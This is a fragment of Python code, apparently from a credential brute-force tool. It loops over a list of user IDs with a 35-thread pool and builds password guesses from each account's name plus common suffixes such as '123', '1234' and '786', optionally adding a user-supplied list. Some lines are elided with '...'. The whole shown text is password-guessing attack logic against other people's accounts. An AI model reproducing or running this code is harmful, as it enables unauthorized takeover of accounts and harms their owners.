		...
		with __Kiky__(max_workers=35) as (form):
			for uname in self.id:
				try:
					...
					zaq=zZzZ[0]
					if len(zaq)>=6:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'786', zaq+'12', zaq+'12345', nama_aq]
					elif len(zaq)<=2:
						pww_ = [zaq+'1234', zaq+'12345', nama_aq]
					elif len(zaq)<=5:
						pww_ = [zaq+'123', zaq+'1234', zaq+'786', zaq+'12345', nama_aq]
					else:
						pww_ = [zaq, zaq+'123', zaq+'1234', zaq+'786', zaq+'12345', nama_aq]
					if pasq in ("N","n"):
						pww_ = pww_
					else:
						pww_ = pww_ + tambahx
